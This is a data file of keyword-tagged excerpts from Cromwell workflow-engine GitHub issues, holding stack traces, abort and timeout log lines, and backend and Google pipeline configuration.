com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:432); at com.google.api.client.googleapis.services.AbstractGoogleCl",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:14414,abort,abort,14414,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['abort'],['abort']
Safety,"tractGoogleClientRequest.java:352); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469); at com.google.cloud.hadoop.util.AbstractGoogleAsyncWriteChannel$UploadOperation.call(AbstractGoogleAsyncWriteChannel.java:357); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-10-27 13:10:46,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:47,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:48,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:49,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:50,94] [info] Waiting for 1 workflows to abort...; ^C[2016-10-27 13:10:51,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:52,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:53,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:54,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:55,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:56,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:57,16] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:16446,abort,abort,16446,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['abort'],['abort']
Safety,"tractGoogleClientRequest.java:352); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469); at com.google.cloud.hadoop.util.AbstractGoogleAsyncWriteChannel$UploadOperation.call(AbstractGoogleAsyncWriteChannel.java:357); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-10-27 13:10:57,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:58,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:59,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:00,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:01,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:02,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:03,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:04,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:05,57] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113); at com.google.api.client.googleapis.services.json.Abstrac",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:18963,abort,abort,18963,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['abort'],['abort']
Safety,"tractGoogleClientRequest.java:352); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469); at com.google.cloud.hadoop.util.AbstractGoogleAsyncWriteChannel$UploadOperation.call(AbstractGoogleAsyncWriteChannel.java:357); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-10-27 13:11:05,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:06,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:07,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:08,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:09,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:10,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:11,95] [info] Waiting for 1 workflows to abort...; Killed; lichtens@lichtens-big:~/test_eval$ [2016-10-27 13:11:12,80] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.n",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:21271,abort,abort,21271,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['abort'],['abort']
Safety,"ts the whole system from being slowed down when waiting for responses from external resources for instance; io-dispatcher {; type = Dispatcher; executor = ""fork-join-executor""; # Using the forkjoin defaults, this can be tuned if we wish; }. # A dispatcher for actors handling API operations; # Keeps the API responsive regardless of the load of workflows being run; api-dispatcher {; type = Dispatcher; executor = ""fork-join-executor""; }. # A dispatcher for engine actors; # Because backends behaviour is unpredictable (potentially blocking, slow) the engine runs; # on its own dispatcher to prevent backends from affecting its performance.; engine-dispatcher {; type = Dispatcher; executor = ""fork-join-executor""; }. # A dispatcher used by supported backend actors; backend-dispatcher {; type = Dispatcher; executor = ""fork-join-executor""; }. # Note that without further configuration, all other actors run on the default dispatcher; }; }. spray.can {; server {; request-timeout = 40s; }; client {; request-timeout = 40s; connecting-timeout = 40s; }; }. system {; // If 'true', a SIGINT will trigger Cromwell to attempt to abort all currently running jobs before exiting; abort-jobs-on-terminate = false. // Max number of retries per job that the engine will attempt in case of a retryable failure received from the backend; max-retries = 10. // If 'true' then when Cromwell starts up, it tries to restart incomplete workflows; workflow-restart = true. // Cromwell will cap the number of running workflows at N; max-concurrent-workflows = 5000. // Cromwell will launch up to N submitted workflows at a time, regardless of how many open workflow slots exist; max-workflow-launch-count = 50. // Number of seconds between workflow launches; new-workflow-poll-rate = 20. // Since the WorkflowLogCopyRouter is initialized in code, this is the number of workers; number-of-workflow-log-copy-workers = 10; }. workflow-options {; // These workflow options will be encrypted when stored in the database; encry",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1480:84381,timeout,timeout,84381,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1480,3,['timeout'],['timeout']
Safety,turn abort request into GET request,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2318:5,abort,abort,5,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2318,1,['abort'],['abort']
Safety,"tus"": ""error"",; ""message"": ""The server was not able to produce a timely response to your request."". The workflow is removed from WORKFLOW_STORE_ENTRY but the associated jobs are still present in JOB_STORE_ENTRY. . There are no errors in the logs: ; `; 2016-12-12 18:22:26,139 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(8a965a5e)]: Abort received. Aborting 11 EJEAs; 2016-12-12 18:29:42,727 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(73be7f27)]: Abort received. Aborting 13 EJEAs; 2016-12-12 18:31:29,146 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(13965e09)]: Abort received. Aborting 10 EJEAs; 2016-12-12 18:31:46,093 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(804a56b6)]: Abort received. Aborting 11 EJEAs; 2016-12-12 18:32:05,063 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(2c6302c8)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:32:25,094 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(793dd16f)]: Abort received. Aborting 5 EJEAs; 2016-12-12 18:32:38,555 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(4fddebd4)]: Abort received. Aborting 13 EJEAs; 2016-12-12 18:32:50,674 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(aadd5082)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:33:01,265 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(edaa9993)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:33:12,453 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(c2caa0f6)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:33:30,399 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(17a61aa5)]: Ab",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1775:1270,Abort,Abort,1270,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1775,1,['Abort'],['Abort']
Safety,"ty \; exec \; gemBS.simg \; /home/vanessa/Documents/Dropbox/Code/labs/cherry/pipelines/wgbs-pipeline/cromwell-executions/wgbs/967af8b6-0d68-44c4-b04e-204674333468/call-flatten_/execution/script &; echo $?; [2018-08-27 02:04:16,88] [info] DispatchedConfigAsyncJobExecutionActor [967af8b6wgbs.flatten_:NA:1]: job id: 0; [2018-08-27 02:04:16,88] [info] DispatchedConfigAsyncJobExecutionActor [967af8b6wgbs.flatten_:NA:1]: Status change from - to Done; [2018-08-27 02:04:19,50] [info] WorkflowExecutionActor-967af8b6-0d68-44c4-b04e-204674333468 [967af8b6]: Workflow wgbs complete. Final Outputs:; {. }; [2018-08-27 02:04:19,53] [info] WorkflowManagerActor WorkflowActor-967af8b6-0d68-44c4-b04e-204674333468 is in a terminal state: WorkflowSucceededState; [2018-08-27 02:04:22,18] [info] SingleWorkflowRunnerActor workflow finished with status 'Succeeded'.; {; ""outputs"": {. },; ""id"": ""967af8b6-0d68-44c4-b04e-204674333468""; }; [2018-08-27 02:04:26,91] [info] Workflow polling stopped; [2018-08-27 02:04:26,91] [info] Shutting down WorkflowStoreActor - Timeout = 5 seconds; [2018-08-27 02:04:26,92] [info] Aborting all running workflows.; [2018-08-27 02:04:26,92] [info] WorkflowStoreActor stopped; [2018-08-27 02:04:26,93] [info] Shutting down WorkflowLogCopyRouter - Timeout = 5 seconds; [2018-08-27 02:04:26,93] [info] Shutting down JobExecutionTokenDispenser - Timeout = 5 seconds; [2018-08-27 02:04:26,93] [info] JobExecutionTokenDispenser stopped; [2018-08-27 02:04:26,93] [info] Shutting down WorkflowManagerActor - Timeout = 3600 seconds; [2018-08-27 02:04:26,93] [info] WorkflowLogCopyRouter stopped; [2018-08-27 02:04:26,94] [info] WorkflowManagerActor stopped; [2018-08-27 02:04:26,94] [info] WorkflowManagerActor All workflows finished; [2018-08-27 02:04:26,94] [info] Connection pools shut down; [2018-08-27 02:04:26,94] [info] Shutting down SubWorkflowStoreActor - Timeout = 1800 seconds; [2018-08-27 02:04:26,95] [info] Shutting down JobStoreActor - Timeout = 1800 seconds; [2018-08-27 02:04",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039:6033,Timeout,Timeout,6033,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039,2,"['Abort', 'Timeout']","['Aborting', 'Timeout']"
Safety,"t}""; """""". submit-docker = """"""; # SINGULARITY_CACHEDIR needs to point to a directory accessible by; # the jobs (i.e. not lscratch). Might want to use a workflow local; # cache dir like in run.sh; source /work/share/ac7m4df1o5/bin/cromwell/set_singularity_cachedir.sh; SINGULARITY_CACHEDIR=/work/share/ac7m4df1o5/bin/cromwell/singularity-cache; source /work/share/ac7m4df1o5/bin/cromwell/test.sh ${docker}; echo ""SINGULARITY_CACHEDIR $SINGULARITY_CACHEDIR""; if [ -z $SINGULARITY_CACHEDIR ]; then; CACHE_DIR=$HOME/.singularity; else; CACHE_DIR=$SINGULARITY_CACHEDIR; fi; mkdir -p $CACHE_DIR; echo ""SINGULARITY_CACHEDIR $SINGULARITY_CACHEDIR""; LOCK_FILE=$CACHE_DIR/singularity_pull_flock. # we want to avoid all the cromwell tasks hammering each other trying; # to pull the container into the cache for the first time. flock works; # on GPFS, netapp, and vast (of course only for processes on the same; # machine which is the case here since we're pulling it in the master; # process before submitting).; #flock --exclusive --timeout 1200 $LOCK_FILE \; # singularity exec --containall docker://${docker} \; # echo ""successfully pulled ${docker}!"" &> /dev/null. # Ensure singularity is loaded if it's installed as a module; module load apps/singularity/3.7.3. # Build the Docker image into a singularity image; #IMAGE=$(echo $SINGULARITY_CACHEDIR/pull/${docker}.sif|sed ""s#:#_#g""); #singularity build $IMAGE docker://${docker}. # Submit the script to SLURM; sbatch \; --wait \; --job-name=${job_name} \; --chdir=${cwd} \; --output=${cwd}/execution/stdout \; --error=${cwd}/execution/stderr \; --time=${runtime_minutes} \; ${""--cpus-per-task="" + cpus} \; --mem-per-cpu=${requested_memory_mb_per_core} \; --partition=wzhcexclu06 \; --wrap ""singularity exec --containall --bind ${cwd}:${docker_cwd} $SINGULARITY_CACHEDIR/pull/$docker_image.sif ${job_shell} ${docker_script}""; """""". kill = ""scancel ${job_id}""; check-alive = ""squeue -j ${job_id}""; job-id-regex = ""Submitted batch job (\\d+).*""; }; }. }; }. ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6933:8713,timeout,timeout,8713,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6933,1,['timeout'],['timeout']
Safety,ully run google_labels_good !!! IGNORED !!!; - should successfully run google_labels_sub !!! IGNORED !!!; - should successfully run gpu_cuda_image !!! IGNORED !!!; - should successfully run gpu_on_papi_valid !!! IGNORED !!!; - should successfully run http_inputs !!! IGNORED !!!; - should successfully run http_inputs_cwl !!! IGNORED !!!; - should successfully run input_expressions !!! IGNORED !!!; - should successfully run input_from_bucket_with_requester_pays !!! IGNORED !!!; - should successfully run inter_scatter_dependencies !!! IGNORED !!!; - should successfully run invalidate_bad_caches_jes !!! IGNORED !!!; - should successfully run invalidate_bad_caches_jes_no_copy !!! IGNORED !!!; - should successfully run jes_labels !!! IGNORED !!!; - should successfully run length_slurm_no_docker !!! IGNORED !!!; - should successfully run local_gcs !!! IGNORED !!!; - should successfully run monitoring_log !!! IGNORED !!!; - should successfully run monitoring_log_papiv1 !!! IGNORED !!!; - should successfully run papi_cpu_platform !!! IGNORED !!!; - should successfully run papi_v2_log !!! IGNORED !!!; - should successfully run papiv1_streams !!! IGNORED !!!; - should successfully run prepare_scatter_gather_papi !!! IGNORED !!!; - should successfully run refresh_token !!! IGNORED !!!; - should successfully run refresh_token_sub_workflow !!! IGNORED !!!; - should successfully run requester_pays_engine_functions !!! IGNORED !!!; - should successfully run requester_pays_localization !!! IGNORED !!!; - should successfully run super_massive_array_output !!! IGNORED !!!; - should successfully run workbench_health_monitor_check_papiv1 !!! IGNORED !!!; - should successfully run workbench_health_monitor_check_papiv2 !!! IGNORED !!!; - should successfully run workflow_type_and_version_cwl !!! IGNORED !!!; - should survive a Cromwell restart and recover jobs restart_jes_with_recover !!! IGNORED !!!; - should survive a Cromwell restart when a workflow was failing and recover jobs failures.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4992#issuecomment-512361132:21770,recover,recover,21770,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4992#issuecomment-512361132,2,['recover'],['recover']
Safety,"unts:; - disk: local-disk; path: /cromwell_root; - commands:; - -c; - printf '%s %s\n' ""$(date -u '+%Y/%m/%d %H:%M:%S')"" Done\ delocalization.; entrypoint: /bin/sh; imageUri: gcr.io/google.com/cloudsdktool/cloud-sdk:276.0.0-slim; labels:; logging: Delocalization; timeout: 300s; - alwaysRun: true; commands:; - -c; - python -c 'import base64; print(base64.b64decode(""xxxxxx""));'; > /tmp/1xxxxxx.sh && chmod u+x /tmp/1xxxxxx.sh; && sh /tmp/1xxxxxx.sh; entrypoint: /bin/sh; imageUri: gcr.io/google.com/cloudsdktool/cloud-sdk:276.0.0-slim; labels:; tag: Delocalization; - alwaysRun: true; commands:; - -c; - python -c 'import base64; print(base64.b64decode(""xxxxxx""));'; > /tmp/xxxxxx.sh && chmod u+x /tmp/xxxxxx.sh; && sh /tmp/xxxxxx.sh; entrypoint: /bin/sh; imageUri: gcr.io/google.com/cloudsdktool/cloud-sdk:276.0.0-slim; labels:; tag: Delocalization; environment:; MEM_SIZE: '2.0'; MEM_UNIT: GB; resources:; virtualMachine:; bootDiskSizeGb: 12; bootImage: projects/cos-cloud/global/images/family/cos-stable; disks:; - name: local-disk; sizeGb: 10; type: pd-ssd; labels:; cromwell-workflow-id: xxxxxx; goog-pipelines-worker: 'true'; wdl-task-name: hello; machineType: custom-1-2048; network: {}; nvidiaDriverVersion: 450.51.06; serviceAccount:; email: default; scopes:; - https://www.googleapis.com/auth/compute; - https://www.googleapis.com/auth/devstorage.full_control; - https://www.googleapis.com/auth/cloudkms; - https://www.googleapis.com/auth/userinfo.email; - https://www.googleapis.com/auth/userinfo.profile; - https://www.googleapis.com/auth/monitoring.write; - https://www.googleapis.com/auth/bigquery; - https://www.googleapis.com/auth/cloud-platform; volumes:; - persistentDisk:; sizeGb: 10; type: pd-ssd; volume: local-disk; zones:; - us-central1-a; - us-central1-b; timeout: 604800s; startTime: '2021-08-03T15:22:07.789742627Z'; name: projects/xxxxxx/locations/us-central1/operations/xxxxxx; response:; '@type': type.googleapis.com/cloud.lifesciences.pipelines.RunPipelineResponse. ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6462:21869,timeout,timeout,21869,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6462,1,['timeout'],['timeout']
Safety,"use QPS based locks from Google.; # 1000 is the default ""Queries per 100 seconds per user"", 50000 is the default ""Queries per 100 seconds""; # See https://cloud.google.com/genomics/quotas for more information; genomics-api-queries-per-100-seconds = 25000. # Polling for completion backs-off gradually for slower-running jobs.; # This is the maximum polling interval (in seconds):; maximum-polling-interval = 600. # Optional Dockerhub Credentials. Can be used to access private docker images.; dockerhub {; # account = """"; # token = """"; }. #docker-image-cache-manifest-file = ""gs://xxxxx-xxxxx/xxxxx.json"". # Number of workers to assign to PAPI requests; request-workers = 3. # Optional configuration to use high security network (Virtual Private Cloud) for running jobs.; # See https://cromwell.readthedocs.io/en/stable/backends/Google/ for more details.; # virtual-private-cloud {; # network-label-key = ""network-key""; # auth = ""application-default""; # }. # Global pipeline timeout; # Defaults to 7 days; max 30 days; # pipeline-timeout = 7 days. genomics {; # A reference to an auth defined in the `google` stanza at the top. This auth is used to create; # Pipelines and manipulate auth JSONs.; auth = ""application-default"". // alternative service account to use on the launched compute instance; // NOTE: If combined with service account authorization, both that serivce account and this service account; // must be able to read and write to the 'root' GCS path; compute-service-account = ""default"". # Endpoint for APIs, no reason to change this unless directed by Google.; endpoint-url = ""https://lifesciences.googleapis.com/"". # Currently Cloud Life Sciences API is available only in `us-central1` and `europe-west2` locations.; location = ""us-central1"". # Restrict access to VM metadata. Useful in cases when untrusted containers are running under a service; # account not owned by the submitting user; restrict-metadata-access = false. # Pipelines v2 only: specify the number of times localizati",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6462:2558,timeout,timeout,2558,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6462,2,['timeout'],['timeout']
Safety,"use parallel composite uploads during delocalization.; # Parallel composite uploads can result in a significant improvement in delocalization speed for large files; # but may introduce complexities in downloading such files from GCS, please see; # https://cloud.google.com/storage/docs/gsutil/commands/cp#parallel-composite-uploads for more information.; #; # If set to 0 parallel composite uploads are turned off. The default Cromwell configuration turns off; # parallel composite uploads, this sample configuration turns it on for files of 150M or larger.; parallel-composite-upload-threshold=""150M""; }. # Controls how batched requests to PAPI are handled:; batch-requests {; timeouts {; # Timeout when attempting to connect to PAPI to make requests:; # read = 10 seconds. # Timeout waiting for batch responses from PAPI:; #; # Note: Try raising this value if you see errors in logs like:; # WARN - PAPI request worker PAPIQueryWorker-[...] terminated. 99 run creation requests, 0 status poll requests, and 0 abort requests will be reconsidered. If any of those succeeded in the cloud before the batch request failed, they might be run twice.; # ERROR - Read timed out; # connect = 10 seconds; }; }; filesystems {; gcs {; # A reference to a potentially different auth for manipulating files via engine functions.; auth = ""application-default""; # Google project which will be billed for the requests; project = ""xxxxx-xxxxx-xxxxx"". caching {; # When a cache hit is found, the following duplication strategy will be followed to use the cached outputs; # Possible values: ""copy"", ""reference"". Defaults to ""copy""; # ""copy"": Copy the output files; # ""reference"": DO NOT copy the output files but point to the original output files instead.; # Will still make sure than all the original output files exist and are accessible before; # going forward with the cache hit.; duplication-strategy = ""copy""; }; }; }. default-runtime-attributes {; cpu: 4; failOnStderr: false; continueOnReturnCode: 0; memory: ""2 ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6462:4851,abort,abort,4851,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6462,1,['abort'],['abort']
Safety,"use parallel composite uploads during delocalization.; # Parallel composite uploads can result in a significant improvement in delocalization speed for large files; # but may introduce complexities in downloading such files from GCS, please see; # https://cloud.google.com/storage/docs/gsutil/commands/cp#parallel-composite-uploads for more information.; #; # If set to 0 parallel composite uploads are turned off. The default Cromwell configuration turns off; # parallel composite uploads, this sample configuration turns it on for files of 150M or larger.; parallel-composite-upload-threshold=""150M""; }. # Controls how batched requests to PAPI are handled:; batch-requests {; timeouts {; # Timeout when attempting to connect to PAPI to make requests:; # read = 10 seconds. # Timeout waiting for batch responses from PAPI:; #; # Note: Try raising this value if you see errors in logs like:; # WARN - PAPI request worker PAPIQueryWorker-[...] terminated. 99 run creation requests, 0 status poll requests, and 0 abort requests will be reconsidered. If any of those succeeded in the cloud before the batch request failed, they might be run twice.; # ERROR - Read timed out; # connect = 10 seconds; }; }; filesystems {; gcs {; # A reference to a potentially different auth for manipulating files via engine functions.; auth = ""service-account""; # Google project which will be billed for the requests; project = ""***-***"". caching {; # When a cache hit is found, the following duplication strategy will be followed to use the cached outputs; # Possible values: ""copy"", ""reference"". Defaults to ""copy""; # ""copy"": Copy the output files; # ""reference"": DO NOT copy the output files but point to the original output files instead.; # Will still make sure than all the original output files exist and are accessible before; # going forward with the cache hit.; duplication-strategy = ""copy""; }; }; }. default-runtime-attributes {; cpu: 2; failOnStderr: false; continueOnReturnCode: 0; memory: ""2048 MB""; bootDi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6469:14497,abort,abort,14497,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6469,1,['abort'],['abort']
Safety,"uspicious:. [Travis](https://travis-ci.com/github/broadinstitute/cromwell/jobs/403803242) times out at 180m with these messages:; ```; 2020-10-22 15:23:30,919 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:23:35,939 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:23:40,959 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:23:45,978 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:23:50,999 cromwell-system-akka.dispatchers.engine-dispatcher-10 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. …2020-10-22 15:23:56,019 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:01,039 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:06,058 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:11,079 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:16,108 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:21,129 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:26,149 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:31,169 cromwell-system-a",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929:982,Abort,Abort,982,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929,1,['Abort'],['Abort']
Safety,"usr/lib/python2.7/httplib.py\"", line 366, in _read_status\n line = self.fp.readline()\n File \""/usr/lib/python2.7/socket.py\"", line 447, in readline\n data = self._sock.recv(self._rbufsize)\nsocket.timeout: timed out\n)""; at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor$.StandardException(JesAsyncBackendJobExecutionActor.scala:63); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.handleExecutionFailure(JesAsyncBackendJobExecutionActor.scala:411); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.handleExecutionFailure(JesAsyncBackendJobExecutionActor.scala:67); at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$1.applyOrElse(StandardAsyncExecutionActor.scala:666); at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$1.applyOrElse(StandardAsyncExecutionActor.scala:663); at scala.concurrent.Future$$anonfun$recoverWith$1.apply(Future.scala:346); at scala.concurrent.Future$$anonfun$recoverWith$1.apply(Future.scala:345); at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72); at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at 